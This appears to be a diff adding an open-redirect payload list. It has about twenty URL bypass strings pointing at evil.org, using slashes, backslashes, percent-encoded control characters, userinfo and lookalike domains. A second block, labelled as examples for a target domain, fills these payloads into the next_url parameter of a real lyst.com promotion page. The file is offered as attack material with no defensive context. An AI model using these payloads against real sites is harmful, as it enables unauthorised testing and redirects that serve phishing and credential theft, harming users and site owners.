@@ -1,0 +1,51 @@
+\/evil.org
+\/\/evil.org
+\\evil.org
+//evil.org
+//soundcloud@evil.org
+/\/evil.org
+//%2F/evil.org
+////evil.org
+/%0D/evil.org 
+/%09/evil.org
+/%00/evil.org
+/%0a/evil.org
+/%07/evil.org
+/%2F/evil.org
+/%5Cevil.org
+//google%E3%80%82com
+https://evil.org%3F.soundcloud.com/
+https://evil.org%2523.soundcloud.com/
+https://google?c=.soundcloud.com/ (use # \ also)
+https://soundcloud.computer/
+https://soundcloud.com.mysite.com
+
+
+## EXAMPLES: 
+## removes this domain to your target domain
+##
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=\/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=\/\/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=\\evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=//evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=//lyst@evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/\/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=//%2F/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=////evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%0D/evil.org 
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%09/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%00/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%0a/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%07/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%2F/evil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=/%5Cevil.org
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=//google%E3%80%82com
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=https://evil.org%3F.help.lyst.com/
+https://evil.org%2523.help.lyst.com/
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=https://google?c=.help.lyst.com/ (use # \ also)
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=https://help.lyst.computer/
+https://lyst.com/promotions/24-sevres/1aa81b8f-b0be-4a0d-83d8-94aca833f332/promo-code/?next_url=https://help.lyst.com.mysite.com
+
+
+
+
